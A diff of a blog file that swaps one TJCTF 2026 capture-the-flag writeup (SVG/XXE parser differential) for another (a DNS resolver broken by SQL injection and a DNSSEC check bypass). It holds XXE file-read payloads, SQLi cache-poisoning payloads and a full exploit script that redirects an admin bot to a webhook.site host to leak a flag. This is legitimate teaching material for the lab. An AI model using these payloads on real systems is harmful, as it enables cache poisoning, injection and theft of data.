@@ -1,16 +1,17 @@
 ---
-title: "Web / Opening Night - TJCTF 2026"
-excerpt: "A writeup on the Web / Opening Night challenge from TJCTF 2026"
+title: "Crypto / Trust Issues - TJCTF 2026"
+excerpt: "A writeup on the Crypto / Trust Issues challenge from TJCTF 2026"
 category:
   - "Writeups"
 tags:
   - "CTF"
-  - "Web"
-  - "SVG"
-  - "XML"
-  - "Parser Differential"
-  - "Namespace Confusion"
-  - "Entity Expansion"
+  - "Crypto"
+  - "DNS"
+  - "DNSSEC"
+  - "ECDSA"
+  - "P-521"
+  - "SQL Injection"
+  - "Cache Poisoning"
   - "TJCTF"
   - "2026"
 authors:
@@ -19,389 +20,451 @@ authors:
 
 ## The Challenge
 
-*opening-night*
+*trust-issues*
 
 *Description*
 
-*The new gallery opens tonight.*
+*I made my own DNS resolver and I made sure I could trust it as much as my nameserver by using an even bigger elliptic curve*
 
-*Instance: `https://opening-night-<instance>.tjc.tf` (link might be expired)*
+*The admin bot will visit trust-issues.tjc.tf by querying the DNS resolver (which will be instanced), and the DNS resolver will query the nameserver to find the ip address of the website*
 
-*Hint*
+*DNS Resolver Instancer: `https://dnsresolver-<instance>.tjc.tf`*  
+*Admin Bot: `https://admin-bot.tjctf.org/trust-issues`*
 
-*Two curators inspect each piece uploaded: one hangs the painting, and the other writes the label below.*  
-*The one who hangs it is careful; the one who writes the label, not quite.*
+The goal is to make the admin bot visit a host that we control. The bot queries our resolver instance for:
 
-*The gatekeeper only checks that your file looks like an SVG at the top.*  
-*The one who writes the label takes the first title/desc it sees by name, and not by the true namespace or intent.*  
-*Don't look for new rooms in the art gallery, just change how your art is presented and wrapped before it arrives!*
+```text
+trust-issues.tjc.tf A
+```
 
-*Your payload must survive two different interpretations. One as just harmless text, and the other one as XML.*
+Then it navigates to:
 
-*The trick is not a hidden endpoint or browser JS execution. Keep your payload in the normal upload flow, and think about one stage decoding text before another stage parses XML metadata.*
+```text
+https://<resolver answer>/?flag=<flag>
+```
+
+So the real objective is not to attack the final website directly. The real objective is to make the custom resolver return our own host for `trust-issues.tjc.tf` while still passing its DNSSEC validation.
 
 ## The Walkthrough
 
-This challenge looked like a normal SVG upload challenge at first, but it was much more subtle than simply uploading an SVG and using XXE. The website acts like an art gallery: we upload an SVG, and the server displays the uploaded piece in a catalog with a title, a description, and the SVG size.
+At first glance, the challenge looks like a pure crypto problem. The nameserver signs DNS records using DNSSEC algorithm 17, which is ECDSA over P-521. The description also explicitly mentions "an even bigger elliptic curve", so the obvious thought is to attack the signature scheme.
 
-A normal successful upload is rendered roughly like this:
+The nameserver does have a suspicious signing function:
 
-```html
-<article>
-  <div class="caption">
-    <h2>some title</h2>
-    <p>some description</p>
-    <dl>
-      <dt>Size</dt>
-      <dd>700 x 160</dd>
-    </dl>
-  </div>
-</article>
+```python
+k = secrets.randbits(512)
 ```
 
-So the useful sinks are very limited: `<h2>` for the title, `<p>` for the description, and `<dd>` for the size.
+For P-521, a 512-bit nonce is smaller than the curve order size. With enough signatures, this smells like a Hidden Number Problem attack against ECDSA. However, the resolver implementation had a much easier trust bug, so I did not need to recover the private key.
 
-### First clue: the label parser ignores namespaces
+The solve path I used combines:
 
-The hint says that the label writer takes the first `title` / `desc` it sees "by name", not by the real namespace or intent. So instead of only testing normal SVG metadata:
+1. SQL injection in the resolver cache insertion logic;
+2. cache poisoning of `records` for `trust-issues.tjc.tf.`;
+3. a DNSSEC verifier logic bug where missing signing keys are skipped;
+4. manual admin submission because the admin bot page is protected by reCAPTCHA.
 
-```xml
-<title>SAFE_TITLE</title>
-<desc>SAFE_DESC</desc>
-```
+### Architecture overview
 
-we can place fake metadata in a different namespace:
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">MARK_CUSTOM_TITLE</x:title>
-    <x:desc xmlns:x="urn:not-svg">MARK_CUSTOM_DESC</x:desc>
-  </metadata>
-
-  <title>SAFE_TITLE</title>
-  <desc>SAFE_DESC</desc>
-  <rect width="700" height="160" fill="white"/>
-</svg>
-```
-
-The server rendered:
+The attachment contains three main services:
 
 ```text
-h2: 'MARK_CUSTOM_TITLE'
-p : 'MARK_CUSTOM_DESC'
+admin bot  --->  custom DNS resolver  --->  nameserver
+                                      \
+                                       \--> public DoH upstream for other names
 ```
 
-That confirms the first bug. The cataloger does not require the SVG namespace. It is probably doing something like `find("title")` or `//*[local-name()="title"]`, instead of only accepting the real SVG nodes:
+The important resolver behavior is:
+
+- if the query name is `trust-issues.tjc.tf.` and the type is `A`, `AAAA`, `CNAME`, or `DNSKEY`, it queries the challenge nameserver;
+- otherwise, it queries a public DNS-over-HTTPS upstream;
+- it caches all returned records in a local SQLite database;
+- before returning a cached record, it tries to validate the RRset with DNSSEC.
+
+The resolver only exposes normal `A`, `AAAA`, and `CNAME` queries to users:
+
+```python
+SUPPORTED_TYPES = {
+    "A": A,
+    "AAAA": AAAA,
+    "CNAME": CNAME,
+}
+```
+
+So we cannot simply ask the resolver to cache arbitrary `DNSKEY` or `DS` records from the HTTP interface. We need another primitive.
+
+### Bug 1: SQL injection in cache insertion
+
+The resolver caches records with string interpolation:
+
+```python
+cursor.execute(
+    f"INSERT INTO records VALUES ('{record['name']}', {record['type']}, "
+    f"{record['TTL']}, {expires}, '{record['data']}')"
+)
+```
+
+Both `record['name']` and `record['data']` come from DNS responses. That means if we can make the resolver fetch a DNS answer whose owner name contains SQL syntax, the resolver will execute it.
+
+The next question is: how do we make a public DNS response preserve our malicious owner name?
+
+Wildcard DNS services such as `sslip.io` are perfect for this. A name like:
 
 ```text
-{http://www.w3.org/2000/svg}title
-{http://www.w3.org/2000/svg}desc
+anything.127.0.0.1.sslip.io
 ```
 
-This gives us control over the gallery label, but it is not enough for the flag yet.
+resolves to `127.0.0.1`, and the returned answer owner name remains our full query name. Therefore, we can put the SQL injection payload in the leftmost labels and let the resolver cache the resulting answer.
 
-### Dead end 1: raw DOCTYPE does not expand in the label
-
-The obvious next idea was entity expansion. I tried a raw XML document with an internal entity:
-
-```xml
-<!DOCTYPE svg [
-  <!ENTITY e "ENTITY_OK">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">&e;</x:title>
-    <x:desc xmlns:x="urn:not-svg">DESC</x:desc>
-  </metadata>
-</svg>
-```
-
-However, the output was:
+The resolver accepts a user-controlled `upstream` parameter, but using arbitrary external JSON upstreams was unreliable. The stable method is to point the upstream to Google DoH with the malicious query already embedded:
 
 ```text
-h2: '&e;'
-p : 'DESC'
+https://dns.google/resolve?name=<payload>.127.0.0.1.sslip.io&type=A&do=true
 ```
 
-In the normal raw-SVG path, the label parser does not expand the entity. This was an important trap: if we stop here, we may incorrectly assume that entity expansion is impossible in the challenge.
+When the resolver later appends its own `name=seed...&type=A&do=true`, Google still uses the first `name` and `type` parameters. The returned DNS answer is then cached by the vulnerable resolver.
 
-### Dead end 2: external XXE and XInclude are blocked
+### Bug 2: DNSSEC validation succeeds when no signing key matches
 
-I also tried the usual external XXE payloads:
+The resolver validates a cached RRset roughly like this:
 
-```xml
-<!ENTITY xxe SYSTEM "file:///flag">
-<!ENTITY xxe SYSTEM "file:///flag.txt">
-<!ENTITY xxe SYSTEM "file:///app/flag.txt">
+```python
+for sig_row in rrsigs:
+    rrsig = parse_rrsig(sig_row)
+    signing_key = find_signing_key(rrsig, dnskeys)
+    if not signing_key:
+        continue
+
+    valid = verify_rrset(rrset, rrsig, signing_key["public_key_b64"])
+    if not valid:
+        return False
+return True
 ```
 
-They did not leak anything. I also tried OOB parameter entities with `webhook.site`, but the webhook never received a request. That means external entity loading is disabled.
+This is the critical trust issue.
 
-XInclude was also not processed:
+If an RRSIG exists, but none of the cached DNSKEY records match the RRSIG key tag, the loop just `continue`s. If every signature is skipped this way, the function reaches the final `return True`.
 
-```xml
-<xi:include href="file:///flag" parse="text"/>
+That means a poisoned RRset can pass validation as long as:
+
+1. there is at least one RRSIG cached for the name and type;
+2. there is at least one DNSKEY cached for the signer;
+3. none of the DNSKEYs match the real RRSIG key tag.
+
+We do not need to forge a P-521 ECDSA signature. We only need to make the resolver use a fake DNSKEY so it cannot find the real signing key.
+
+### Bug 3: fake DNSKEY validation also passes
+
+The resolver validates DNSKEYs using DS records. But it only iterates over keys with KSK flag `257`:
+
+```python
+ksks = [r for r in dnskey_records if (r["data"].split()[0] == "257")]
+
+for key_record in ksks:
+    for ds in parsed_ds:
+        if not verify_ds(key_record["data"], ds):
+            raise Exception(...)
+return True
 ```
 
-So this challenge is not a normal "read `/flag` with XXE" challenge.
+So if we cache only a fake ZSK with flag `256`, then `ksks` is empty. The loop does not run and validation returns `True`.
 
-### Dead end 3: multipart confusion and SSTI are not the bug
-
-Because the hint mentions changing how the art is "wrapped" before it arrives, I also tested multipart confusion:
-
-* `piece` as a text field plus `piece` as a file field
-* duplicate `piece` file parts
-* `Content-Transfer-Encoding: quoted-printable`
-* `Content-Transfer-Encoding: base64`
-
-The app consistently used the real file part and ignored the text part. Base64 uploads were rejected by the intake desk.
-
-I also checked for SSTI by uploading a label containing:
+For example, this fake DNSKEY is enough:
 
 ```text
-{{7*7}}
+256 3 17 AA==
 ```
 
-The response printed it literally, so SSTI was not involved.
-
-### The real primitive: full-file HTML-unescape before XML parsing
-
-The key hint is this sentence:
-
-> Your payload must survive two different interpretations. One as just harmless text, and the other one as XML.
-
-The first almost-correct attempt was to place escaped XML inside `x:title`, but that fails when we need a `DOCTYPE`, because after decoding the `DOCTYPE` appears inside an element:
-
-```xml
-<x:title>
-  <!DOCTYPE svg [...]>
-  <svg>...</svg>
-</x:title>
-```
-
-In XML, `DOCTYPE` must appear in the document prolog, not inside another element.
-
-The correct trick is to HTML-escape the **entire XML document**.
-
-For example, this is the XML document that we want the second parser to see:
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">WHOLE_TITLE</x:title>
-    <x:desc xmlns:x="urn:not-svg">WHOLE_DESC</x:desc>
-  </metadata>
-  <rect width="100%" height="100%" fill="white"/>
-</svg>
-```
-
-But the file we actually upload is the same document escaped once:
-
-```html
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;700&quot; height=&quot;160&quot;&gt;
-  &lt;metadata&gt;
-    &lt;x:title xmlns:x=&quot;urn:not-svg&quot;&gt;WHOLE_TITLE&lt;/x:title&gt;
-    &lt;x:desc xmlns:x=&quot;urn:not-svg&quot;&gt;WHOLE_DESC&lt;/x:desc&gt;
-  &lt;/metadata&gt;
-  &lt;rect width=&quot;100%&quot; height=&quot;100%&quot; fill=&quot;white&quot;/&gt;
-&lt;/svg&gt;
-```
-
-The server accepts it and renders:
+We also cache a dummy DS record so `get_cached_records(zone, DS)` is non-empty:
 
 ```text
-h2: 'WHOLE_TITLE'
-p : 'WHOLE_DESC'
-dd: ['700 x 160']
+1 17 2 deadbeef
 ```
 
-That means one stage decodes the upload from HTML entities back into XML, and another stage parses the decoded XML as SVG metadata.
+The DS value does not need to be valid because there are no KSK records to check against it.
 
-### Final step: internal entity expansion in the decoded XML path
+### Putting the cache poison together
 
-Now we can put the `DOCTYPE` at the beginning of the decoded XML document, where it is valid.
+We need to insert three rows into the resolver's `records` table:
 
-Before escaping, the XML is:
-
-```xml
-<!DOCTYPE svg [
-  <!ENTITY e "FINAL_ENTITY_OK">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">&e;</x:title>
-    <x:desc xmlns:x="urn:not-svg">FINAL_DESC</x:desc>
-  </metadata>
-  <title>SAFE</title>
-  <desc>SAFE</desc>
-  <rect width="100%" height="100%" fill="white"/>
-</svg>
+```text
+trust-issues.tjc.tf.  A       webhook.site/<token>/
+trust-issues.tjc.tf.  DNSKEY  256 3 17 AA==
+trust-issues.tjc.tf.  DS      1 17 2 deadbeef
 ```
 
-The uploaded file is the entire XML document escaped once:
+The A record points to our Webhook.site receiver. The important detail is that the data is not an IPv4 address. That is fine because if DNSSEC verification is skipped before `verify_rrset()` encodes the RRset, the resolver simply returns the string as the A record data.
 
-```html
-&lt;!DOCTYPE svg [
-  &lt;!ENTITY e &quot;FINAL_ENTITY_OK&quot;&gt;
-]&gt;
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; ...
+The SQLi payload for the fake A record is:
+
+```sql
+x',1,1,1,'x'),('trust-issues.tjc.tf.',1,300,4102444800,'webhook.site/<token>/')--
 ```
 
-After the server decodes it, the XML parser sees a real document with a real `DOCTYPE`, expands the internal entity, and the challenge returns the flag.
+For DNSKEY and DS records, spaces are inconvenient inside DNS labels, so I used SQLite `replace()` to create tab characters at SQL execution time:
+
+```sql
+x',1,1,1,'x'),('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--
+```
+
+```sql
+x',1,1,1,'x'),('trust-issues.tjc.tf.',43,300,4102444800,replace('1_17_2_deadbeef','_',x'09'))--
+```
+
+After those rows are cached, we query:
+
+```text
+https://dnsresolver-<instance>.tjc.tf/?name=trust-issues.tjc.tf&type=A
+```
+
+The resolver already has our fake A record, so it does not need to fetch the A record again. But it still needs an RRSIG for `trust-issues.tjc.tf. A`, so it fetches the real RRSIG from the challenge nameserver.
+
+Then validation uses:
+
+```text
+real RRSIG(A) + fake DNSKEY
+```
+
+The key tag does not match, so the signature is skipped, and the verifier incorrectly returns `True`.
+
+The final resolver response becomes:
+
+```json
+{"data":"webhook.site/<token>/","name":"trust-issues.tjc.tf.","type":1}
+```
+
+### Admin bot and reCAPTCHA
+
+One easy mistake is trying to submit to the admin bot with `curl` or `requests`.
+
+This fails because the admin page is protected by reCAPTCHA:
+
+```text
+location: ?url=https%3A%2F%2Fdnsresolver-...tjc.tf%2F&msg=The%20reCAPTCHA%20is%20invalid.
+```
+
+So the final script should only poison the resolver and print the admin URL. Then we submit the resolver URL manually in the browser and solve the reCAPTCHA.
+
+Once the admin bot accepts the submission, it queries the poisoned resolver, receives:
+
+```text
+webhook.site/<token>/
+```
+
+and visits:
+
+```text
+https://webhook.site/<token>/?flag=tjctf{...}
+```
+
+The flag appears in the Webhook.site request log.
 
 ## Final Exploit
 
 ```python
 #!/usr/bin/env python3
-import html
-import re
-import sys
+import argparse
+import random
 import time
-from urllib.parse import urljoin
+from urllib.parse import quote
 
 import requests
 
-BASE = sys.argv[1].strip("'\"").rstrip("/")
-FLAG_RE = re.compile(r"tjctf\{[^}]+\}", re.I)
+WEBHOOK = "https://webhook.site"
+RECORD_SUFFIXES = [
+    "127.0.0.1.sslip.io",
+    "1.1.1.1.sslip.io",
+    "127.0.0.1.nip.io",
+]
 
 
-def find_form(session):
-    r = session.get(BASE + "/", timeout=20)
-
-    form = re.search(r"(?is)<form\b[^>]*>.*?</form>", r.text)
-    if not form:
-        return BASE + "/submit", "piece"
-
-    form = form.group(0)
-
-    action_m = re.search(r'''(?is)\baction=["']?([^"'\s>]*)''', form)
-    action = urljoin(BASE + "/", action_m.group(1) if action_m else "/submit")
-
-    field = "piece"
-    file_m = re.search(r'''(?is)<input\b[^>]*type=["']?file["']?[^>]*>''', form)
-    if file_m:
-        name_m = re.search(r'''(?is)\bname=["']([^"']+)["']''', file_m.group(0))
-        if name_m:
-            field = name_m.group(1)
-
-    return action, field
+def create_webhook_token(s):
+    r = s.post(
+        f"{WEBHOOK}/token",
+        json={
+            "default_status": 200,
+            "default_content": "ok",
+            "default_content_type": "text/plain",
+            "timeout": 0,
+        },
+        timeout=20,
+    )
+    r.raise_for_status()
+    token = r.json()["uuid"]
+    print(f"[*] Webhook token: {token}")
+    print(f"[*] Receiver: {WEBHOOK}/{token}")
+    return token
 
 
-def build_payload():
-    inner_xml = '''<!DOCTYPE svg [
-  <!ENTITY e "FINAL_ENTITY_OK">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">&e;</x:title>
-    <x:desc xmlns:x="urn:not-svg">FINAL_DESC</x:desc>
-  </metadata>
-  <title>SAFE</title>
-  <desc>SAFE</desc>
-  <rect width="100%" height="100%" fill="white"/>
-</svg>
-'''
+def google_upstream(qname, qtype="A"):
+    return "https://dns.google/resolve?name=%s&type=%s&do=true" % (
+        quote(qname, safe=""),
+        quote(qtype, safe=""),
+    )
 
-    # Critical: escape the whole XML document exactly once.
-    return html.escape(inner_xml, quote=True).encode()
+
+def hit_resolver(s, resolver, upstream, label, timeout=35):
+    seed = f"seed-{random.randrange(1 << 48):012x}.invalid"
+    try:
+        r = s.get(
+            resolver,
+            params={"name": seed, "type": "A", "upstream": upstream},
+            timeout=timeout,
+        )
+        print(f"[*] {label}: HTTP {r.status_code}: {r.text[:220].replace(chr(10), ' ')}")
+        return r.status_code
+    except Exception as e:
+        print(f"[!] {label}: {e}")
+        return None
+
+
+def stage_record_insert(s, resolver, payload_label, suffixes):
+    for suffix in suffixes:
+        qname = f"{payload_label}.{suffix}"
+        max_label = max(map(len, qname.split(".")))
+        print(f"[*] stage qname length={len(qname)} maxlabel={max_label} suffix={suffix}")
+        if len(qname) > 253 or max_label > 63:
+            print("[!] skipped: DNS name too long")
+            continue
+        status = hit_resolver(s, resolver, google_upstream(qname, "A"), f"seed via {suffix}")
+        if status in (404, 500, 502):
+            return True
+    return False
+
+
+def build_payloads(token):
+    target = f"webhook.site/{token}/"
+
+    a_payload = (
+        "x',1,1,1,'x'),"
+        f"('trust-issues.tjc.tf.',1,300,4102444800,'{target}')--"
+    )
+    dnskey_payload = (
+        "x',1,1,1,'x'),"
+        "('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--"
+    )
+    ds_payload = (
+        "x',1,1,1,'x'),"
+        "('trust-issues.tjc.tf.',43,300,4102444800,replace('1_17_2_deadbeef','_',x'09'))--"
+    )
+    return target, [a_payload, dnskey_payload, ds_payload]
+
+
+def check_resolver(s, resolver):
+    r = s.get(resolver, params={"name": "trust-issues.tjc.tf", "type": "A"}, timeout=25)
+    print(f"[*] Resolver check HTTP {r.status_code}: {r.text[:360].replace(chr(10), ' ')}")
+    try:
+        return r.json().get("data", "")
+    except Exception:
+        return ""
 
 
 def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("resolver", help="fresh resolver instance, e.g. https://dnsresolver-....tjc.tf/")
+    ap.add_argument("--record-suffix", action="append")
+    args = ap.parse_args()
+
+    resolver = args.resolver.strip()
+    if not resolver.endswith("/"):
+        resolver += "/"
+
     s = requests.Session()
-    action, field = find_form(s)
+    token = create_webhook_token(s)
+    target, payloads = build_payloads(token)
+    suffixes = (args.record_suffix or []) + RECORD_SUFFIXES
 
-    payload = build_payload()
+    print("[*] Seeding fake A + fake DNSKEY + fake DS via add_record SQLi...")
+    for i, payload in enumerate(payloads, 1):
+        print(f"[*] payload {i}: len={len(payload)} maxlabel={max(map(len, payload.split('.')))}")
+        stage_record_insert(s, resolver, payload, suffixes)
 
-    for _ in range(10):
-        r = s.post(
-            action,
-            files={field: ("opening.svg", payload, "image/svg+xml")},
-            allow_redirects=True,
-            timeout=30,
-        )
-
-        wait = re.search(r"Try again in (\d+) seconds", r.text)
-        if wait:
-            t = int(wait.group(1)) + 1
-            print(f"[*] rate limited, sleeping {t}s")
-            time.sleep(t)
-            continue
-
-        m = FLAG_RE.search(r.text)
-        if m:
-            print("[+] FLAG:", m.group(0))
-            return
-
-        print("[!] No flag in response.")
-        print(r.text[:1000])
+    data = check_resolver(s, resolver)
+    if data != target:
+        print("[!] Resolver did not return our poisoned A record.")
+        print(f"    wanted: {target}")
+        print(f"    got:    {data!r}")
+        print("    Use a fresh resolver instance if an older poison row or the real A record is cached.")
         return
 
-    print("[!] Failed due to repeated rate limits.")
+    print(f"[+] Poisoned resolver returns: {target}")
+    print("[*] Submit this resolver URL manually in the admin bot and solve reCAPTCHA:")
+    print(f"    {resolver}")
+    print("[*] Then watch this Webhook.site receiver:")
+    print(f"    {WEBHOOK}/{token}")
 
 
 if __name__ == "__main__":
     main()
 ```
 
-Run:
+Run it against a fresh resolver instance:
 
 ```bash
-python3 solve.py 'https://opening-night-<instance>.tjc.tf'
+python3 solve.py 'https://dnsresolver-<instance>.tjc.tf/'
 ```
 
-Output:
+Expected output:
 
 ```text
-[+] FLAG: tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}
+[*] Webhook token: 851a87d9-2cee-4ff0-aa33-9800c05adcb9
+[*] Receiver: https://webhook.site/851a87d9-2cee-4ff0-aa33-9800c05adcb9
+[*] Seeding fake A + fake DNSKEY + fake DS via add_record SQLi...
+[*] Resolver check HTTP 200: {"data":"webhook.site/851a87d9-2cee-4ff0-aa33-9800c05adcb9/","name":"trust-issues.tjc.tf.","type":1}
+[+] Poisoned resolver returns: webhook.site/851a87d9-2cee-4ff0-aa33-9800c05adcb9/
 ```
+
+Then open the admin bot in the browser, submit the clean resolver URL, solve the reCAPTCHA, and check Webhook.site.
 
 ## Why This Works
 
-The vulnerability is a parser differential between two stages.
+The resolver is supposed to trust only DNSSEC-signed data from the nameserver. However, the trust boundary is broken in two places.
 
-The first interpretation treats the upload as harmless HTML-escaped text:
+First, untrusted DNS response fields are written into SQLite through f-strings. This lets us seed arbitrary cached rows by making the resolver query a wildcard DNS name containing SQL syntax.
 
-```html
-&lt;svg&gt;...&lt;/svg&gt;
-```
+Second, the DNSSEC verifier treats "no matching signing key" as a non-fatal condition. If all signatures are skipped, validation returns success.
 
-The second interpretation decodes that text into XML:
-
-```xml
-<svg>...</svg>
-```
-
-Then the cataloger parses the decoded XML, expands the internal entity, and extracts the first `title` / `desc` by tag name only. Because it ignores namespaces, our `x:title` and `x:desc` are accepted as metadata.
-
-The whole flow is:
+The full exploit flow is:
 
 ```text
-HTML-escaped XML file
-        ↓ html.unescape()
-real XML document with DOCTYPE
-        ↓ XML parse with internal entity expansion
-x:title becomes FINAL_ENTITY_OK
-        ↓ challenge success condition
-flag
+malicious qname under sslip.io
+        ↓
+Google DoH returns an A answer preserving our qname
+        ↓
+resolver caches it with SQL string interpolation
+        ↓
+SQLi inserts fake A + fake DNSKEY + fake DS for trust-issues.tjc.tf.
+        ↓
+resolver fetches real RRSIG(A) from challenge nameserver
+        ↓
+fake DNSKEY does not match the real RRSIG key tag
+        ↓
+verifier skips the signature and returns True
+        ↓
+admin bot receives webhook.site/<token>/ as the trusted A record
+        ↓
+admin visits our webhook with ?flag=...
 ```
+
+The ECDSA P-521 implementation was a tempting rabbit hole, but the successful exploit does not need to break ECDSA at all. The issue is not the math. The issue is that the resolver trusts its cache and mishandles the "no signing key found" case.
 
 ## Final Words
 
-This was a very nice web challenge because the intended trick was not just "upload SVG and do XXE". Raw XXE, external entities, XInclude, webhook exfiltration, multipart confusion, and SSTI all failed.
+This was a great challenge because the title, category, and description push you toward cryptography, while the actual exploit path is a trust-boundary failure in the custom resolver.
 
-The real bug was the combination of:
+The important mistakes were:
 
-1. namespace-insensitive metadata extraction;
-2. decoding the uploaded content before parsing it as XML;
-3. internal entity expansion in the decoded XML path.
+1. SQL string interpolation for DNS response data;
+2. caching data from arbitrary upstream answers;
+3. validating DNSKEYs incorrectly when no KSK exists;
+4. returning `True` when all RRSIGs are skipped due to missing signing keys.
 
-Once the `DOCTYPE` is placed at the start of the decoded document, the internal entity expansion works and the flag appears.
+Once those bugs are combined, the resolver can be made to trust a fake A record and send the admin bot to our webhook.
 
+```text
+tjctf{trust_n0_on3_ev3r}
 ```
-tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}
-```
 
-"Ein schlechter Handwerker gibt seinen Werkzeugen die Schuld." - Don't blame ChatGPT if you cannot solve :D
+"Mit Kanonen auf Spatzen schießen"
 
 <img src="image.png" alt="image.png" style="width: 30%; height: auto;" />
